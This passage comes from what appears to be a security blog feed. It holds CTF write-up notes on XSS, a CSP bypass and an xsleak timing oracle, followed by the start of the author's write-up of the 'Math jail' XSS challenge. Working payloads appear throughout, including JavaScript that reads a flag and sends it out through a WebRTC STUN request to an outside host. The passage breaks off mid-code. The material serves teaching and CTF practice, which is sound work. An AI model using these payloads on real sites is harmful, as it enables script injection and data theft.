punctuation">;</span>    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"🚩🚩🚩"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SEKAI&#123;test_flag&#125;"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span>            <span class="token attr-name">sandbox</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>allow-scripts<span class="token punctuation">"</span></span>            <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;!-- <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span> <span class="token delimiter important">?></span></span> -->&lt;div><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>&lt;/div><span class="token punctuation">"</span></span>        <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>給你一個 30 字的 free XSS，要能執行任意程式碼。</p><p>這邊的巧妙之處是用了 <code>&lt;iframe srcdoc&gt;</code> 搭配 <code>sandbox=allow-scripts</code>，創造出一個可以執行程式碼，但同時 origin 又是 <code>null</code>，而且 CSP 還繼承上層的執行環境。</p><p>因此你無法存取到 top 的任何資訊，包括 name 或是 location 之類的都不行。</p><p>到處找來找去之後在 document 裡面找到了 <code>baseURI</code>，發現它的值原來會繼承上層，而且是完整的 path，所以用 <code>&lt;svg/onload=eval(&quot;&#39;&quot;+baseURI)&gt;</code> 以後搭配 hash 就可以執行任意程式碼了，剛好 30 個字。</p><p>這邊之所以可以用 <code>baseURI</code> 就可以存取到 <code>document.baseURI</code>，是因為 inline event handler 的 scope 會自動被加上 document，這我在<a href="https://blog.huli.tw/2021/10/25/learn-frontend-from-security-pov/">接觸資安才發現我不懂前端</a>這篇裡面有寫到過。</p><p>有了 XSS 以後，可以用 <code>document.childNodes[0].nodeValue</code> 把 flag 取出來，最後的問題就是要怎麼傳出去。這題 CSP 很嚴格，而且重新導向又不能使用，也不能 <code>window.open</code>（話說我覺得這個網頁不用開啟新的 <code>navigate-to</code> 就可以達到類似的效果，很厲害），那就只能用一些現成的繞過了。</p><p>我先試了 dns prefetch 但是沒用，發現 Chrome 在 112 的時候 release 了 <a href="https://chromestatus.com/feature/5553640629075968">Feature: Resoure Hint “Least Restrictive” CSP</a>，或許這就是原因？</p><p>但沒關係，WebRTC 還是有用的，只是我自己試很久都沒試出來怎麼用，最後是看<a href="https://ctftime.org/writeup/37702">別題的 writeup</a>，直接拿裡面 payload 出來用，再搭配 DNS：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> flag <span class="token operator">=</span> document<span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"SEKAI&#123;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">c</span> <span class="token operator">=></span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RTCPeerConnection</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">iceServers</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">urls</span><span class="token operator">:</span> <span class="token string">"stun:"</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">".29e6037fd1.ipv6.1433.eu.org:1337"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">createDataChannel</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">setLocalDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="leakless-note-4-solves">Leakless Note (4 solves)</span></h3><p>前面寫過的 leakynote 的進階版，這次 CSP 變嚴格，多了 <code>default-src &#39;self&#39;</code>，然後頁面上也沒有其他 css 檔案了。</p><p>情境一樣，有一個 iframe，可能會載入可能沒載入，要能偵測到這點。</p><p>作者 strellic 的解法是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// leakless note oracle</span><span class="token keyword">const</span> <span class="token function-variable function">oracle</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">w<span class="token punctuation">,</span> href</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> runs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> samples <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">600</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token number">1e6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> t <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            w<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>b<span class="token punctuation">.</span>buffer<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            samples<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">delete</span> b<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        runs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>samples<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=></span>a<span class="token operator">+</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        w<span class="token punctuation">.</span>location <span class="token operator">=</span> href<span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rate limit</span>        <span class="token keyword">await</span> <span class="token function">waitFor</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    runs<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">median</span><span class="token operator">:</span> <span class="token function">median</span><span class="token punctuation">(</span>runs<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token literal-property property">sum</span><span class="token operator">:</span> runs<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=></span>a<span class="token operator">+</span>b<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        runs    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>當你對 iframe 送一個很大的 message 的時候，花費的時間會不一樣。</p><p>另一隊似乎是開了 1000 個 tab 然後去測網路的時間，現在想想發現好像還滿合理的？如果 iframe 是 200 的話就會發出一堆 request，拖慢網路速度。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;這兩場都有稍微參加一下，但不是每一題都有看，這篇純粹做個筆記而已，稍微記一下解法，不會太詳細。&lt;/p&gt;
&lt;p&gt;老樣子，筆記一下關鍵字：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;GraphQL batch query + alias&lt;/li&gt;
&lt;li&gt;Python os.path.join 絕對路徑&lt;/li&gt;
&lt;li&gt;Svg XSS, foreignObject&lt;/li&gt;
&lt;li&gt;WebRTC CSP bypass&lt;/li&gt;
&lt;li&gt;Status code xsleak&lt;/li&gt;
&lt;li&gt;DNS rebinding&lt;/li&gt;
&lt;li&gt;nmap command injection&lt;/li&gt;
&lt;li&gt;ruby rack 上傳檔案暫存&lt;/li&gt;
&lt;li&gt;buildConstraintViolationWithTemplate EL injection&lt;/li&gt;
&lt;li&gt;request smuggling&lt;/li&gt;
&lt;li&gt;document.baseURI&lt;/li&gt;
&lt;li&gt;200&amp;#x2F;404 status code xsleak&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Intigriti 0823 挑戰 - Math jail 解法以及心得</title>
    <link href="https://blog.huli.tw/2023/08/29/intigriti-0823-author-writeup/"/>
    <id>https://blog.huli.tw/2023/08/29/intigriti-0823-author-writeup/</id>
    <published>2023-08-29T06:10:44.000Z</published>
    <updated>2023-08-29T06:42:09.905Z</updated>
    
    <content type="html"><![CDATA[<p>我在 Intigriti 的每月挑戰中出了一道 XSS 的題目，被我稱之為「Math jail」，連結如下：<a href="https://challenge-0823.intigriti.io/">https://challenge-0823.intigriti.io/</a></p><p>而現在挑戰結束了，因此這篇文章就來講講出題的想法跟解法。 </p><span id="more"></span><p>Math jail 的構想來自於 Hack.lu CTF 2022 的一道題目，名為「Culinary Class Room」，那一題讓你在一個 Python class 上面加上許多 decorator，但是不能有參數，而目標是能執行任意程式碼。</p><p>decorator 其實也只是一個 function call，換句話說，就是你只能用以下這種形式的程式碼：<code>a(b(c(d(e(f())))))</code>，該怎麼做到能夠執行任何你想要的功能？</p><p>類似的題目也曾出現在中國的 CTF，像是這篇就有寫到：<a href="https://xz.aliyun.com/t/9360">PHP无参数RCE</a></p><p>而 Culinary Class Room 的解法是找到一個 list，往裡面 push 很多數字，最後轉成 bytes 然後丟到 eval 裡面去執行。</p><p>舉例來說，底下的程式碼會 push 112 這個數字到 <code>copyright._Printer__filenames</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span><span class="token decorator annotation punctuation">@memoryview<span class="token punctuation">.</span>__basicsize__<span class="token punctuation">.</span>__sub__</span><span class="token decorator annotation punctuation">@staticmethod<span class="token punctuation">.</span>__basicsize__<span class="token punctuation">.</span>__mul__</span><span class="token decorator annotation punctuation">@object<span class="token punctuation">.</span>__instancecheck__</span><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">:</span><span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>當初看到這題以後，我就想說有沒有可能弄一個 JavaScript 的版本？於是 Math jail 就誕生了。</p><p>原本其實沒有限制一定要由 <code>Math.</code> 開頭，但後來發現這樣做比較有趣，而且如果不這樣做的話，直接 <code>alert(document.domain.toString())</code> 就結束了，要過濾掉很多關鍵字才能封住，而且還可能會有 unintended。</p><p>接下來就講一下 Math jail 解法大概的思路是什麼。</p><!-- more --><h2><span id="解法的整體概念">解法的整體概念</span></h2><p>概念就跟前面提到的 Python 版本一樣，找一個 list 然後 push 東西進去，最後 join 然後拿去給 eval 執行，大概會像這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">eval</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// Uncaught ReferenceError: a is not defined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>上面的程式碼最後會執行 <code>a</code>，只要照著這個概念繼續做，就可以拼出 <code>alert()</code>，簡單舉個例子像是這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">]</span><span class="token function">eval</span><span class="token punctuation">(</span>  arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>    <span class="token string">''</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>        arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>          <span class="token string">')'</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>              <span class="token string">'('</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>                arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'t'</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token punctuation">)</span>            <span class="token punctuation">)</span>          <span class="token punctuation">)</span>        <span class="token punctuation">)</span>      <span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因為我們每一個 function call 都不能有參數，所以像是 <code>arr.join(&#39;&#39;)</code> 這種的，可以改成 <code>arr.join(&#39;&#39;.toString())</code>，就能夠符合規則。</p><p>有了這個基本概念以後，接下來的問題就可以分成幾個部分：</p><ol><li>怎麼找到一個可以用的陣列？</li><li>怎麼找到想要的字元？</li><li>怎麼 join？</li><li>怎麼不用 eval 來執行？</li></ol><h2><span id="1-找到陣列">1. 找到陣列</span></h2><p>在題目中有特別給了一個陣列 <code>Math.seeds</code>，我們只要先 pop 就可以把它清空，像是這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">)</span> <span class="token comment">// []</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如此一來，我們就有一個可以放東西的陣列能夠使用。</p><h2><span id="2-找到想要的字元">2. 找到想要的字元</span></h2><p>首先，我們可以看看我們想要的字元是否存在於 <code>Math</code> 當中，例如說 <code>Math.abs.name</code> 就可以拿到 <code>&quot;abs&quot;</code> 這個字元，搭配 <code>at</code> 來使用的話，<code>Math.abs.name.at()</code> 就會是 <code>&quot;a&quot;</code>。</p><p>所以呢，<code>Math.seeds.push(Math.abs.name.at())</code>，就可以讓 <code>Math.seeds</code> 的內容變成 <code>[&quot;a&quot;]</code>。</p><p>而 <code>Arrar.prototype.push</code> 的回傳值會是陣列的長度，因此目前是 1，所以如果能找到某個函式的第二個字是 l，就能減少函式呼叫的次數，是最好的方法。</p><p>講到這裡，你應該已經意識到這一題如果用手動的方式大概會累死，自動化會是更好的方式，因此就來寫個函式吧！</p><p>我們可以用遞迴的方式去尋找能接觸到的物件的每一個屬性是否符合我們想要的規則，並且回傳路徑是什麼，實作如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> matchFn<span class="token punctuation">,</span> initPath<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token function">findTarget</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> initPath<span class="token punctuation">)</span>  <span class="token comment">// return the shortest one</span>  <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token punctuation">.</span>length <span class="token operator">-</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">function</span> <span class="token function">findTarget</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">const</span> list <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> item <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span>      <span class="token keyword">const</span> newPath <span class="token operator">=</span> path <span class="token operator">?</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> key <span class="token operator">:</span> key      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchFn</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">findTarget</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span> newPath<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用的時候這樣用：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'Math'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// Math.abs</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'Math'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// Math.clz32</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以稍微整理一下，變這樣比較好用：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">findMathName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span> char</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>Math<span class="token punctuation">,</span> <span class="token parameter">item</span> <span class="token operator">=></span> item<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">===</span> char<span class="token punctuation">,</span> <span class="token string">'Math'</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findMathName</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// Math.abs</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">findMathName</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// Math.clz32</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>剛剛有說過我們會先嘗試拿陣列的長度去找對應的字元，那如果找不到怎麼辦呢？</p><p>我們可以再嘗試另外一種方式，那就是找固定的 index。</p><p>舉例來說，<code>Math.LN2</code> 是 <code>0.69</code>，而 <code>Array.prototype.at</code> 的參數如果是小數，會自動無條件捨去成整數，因此會變成 <code>0</code>。</p><p>所以，假設原本 <code>arr.push()</code> 回傳的是 2，我們只要在外面加上一層變成：<code>Math.LN2.valueOf(arr.push())</code>，就能讓現在的數字變回 0，就能用第 1 個字元去找我們想要的函式名稱。</p><p>像是這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token 